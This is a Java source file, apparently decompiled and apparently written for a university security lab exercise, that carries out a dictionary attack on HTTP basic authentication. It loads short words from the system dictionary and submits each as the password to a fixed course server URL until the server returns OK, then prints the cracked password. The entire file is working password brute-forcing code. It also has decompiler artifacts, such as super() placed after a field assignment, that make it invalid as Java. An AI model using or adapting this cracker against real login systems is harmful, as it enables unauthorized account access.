public class Dictionary {
    private boolean c;
    int a;
    java.util.Vector b;
    Dictionary() {
        super();
        this.c = false;
        this.b = new java.util.Vector();
        this.a = 0;
        this.b();
        this.a();
    }
    private void a() {
        while ( this.a < this.b.size() ) {
            this.c = this.c();
            if ( this.c ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) this.b.elementAt ( this.a - 1 ) );
                this.a = this.b.size();
            }
        }
    }
    private void b() {
        try {
            java.io.BufferedReader a0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( "/usr/share/lib/dict/words" ) );
            String s = a0.readLine();
            while ( s != null ) {
                if ( s.length() <= 3 ) {
                    this.b.addElement ( ( Object ) s );
                }
                s = a0.readLine();
            }
            return;
        } catch ( java.io.IOException ignoredException ) {
            return;
        }
    }
    private boolean c() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) new Dictionary$MyAuthenticator ( this ) );
        try {
            java.net.HttpURLConnection a0 = ( java.net.HttpURLConnection ) new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            a0.connect();
            if ( a0.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( java.io.IOException ignoredException ) {
        }
        return false;
    }
    public static void main ( String[] a0 ) {
        Dictionary a1 = new Dictionary();
    }
}
class Dictionary$MyAuthenticator extends java.net.Authenticator {
    private Dictionary a;
    Dictionary$MyAuthenticator ( Dictionary a0 ) {
        this.a = a0;
        super();
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        String s = ( String ) this.a.b.elementAt ( this.a.a );
        this.a.a = this.a.a + 1;
        return new java.net.PasswordAuthentication ( "", s.toCharArray() );
    }
}
